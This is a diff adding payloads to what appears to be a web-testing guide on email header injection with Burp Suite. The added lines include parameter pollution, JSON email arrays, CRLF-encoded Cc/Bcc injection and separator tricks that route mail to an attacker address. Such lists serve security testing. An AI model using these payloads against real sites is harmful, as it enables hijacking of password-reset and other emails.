@@ -28,6 +28,21 @@ The HTTP request will be intercepted
 Inject a newline payload into the email parameter: test@gmail.com%0ACc:attacker@gmail.com
 Example modified request body: name=Test&email=test@gmail.com%0ACc:attacker@gmail.com&message
 
+# parameter pollution
+email=victim@mail.com&email=hacker@mail.com
+
+# array of emails
+{"email":["victim@mail.com","hacker@mail.com"]}
+
+# carbon copy
+email=victim@mail.com%0A%0Dcc:hacker@mail.com
+email=victim@mail.com%0A%0Dbcc:hacker@mail.com
+
+# separator
+email=victim@mail.com,hacker@mail.com
+email=victim@mail.com%20hacker@mail.com
+email=victim@mail.com|hacker@mail.com
+
 
 4. Forward the Request
 Click Forward in Burp Suite to send the modified request to the server.
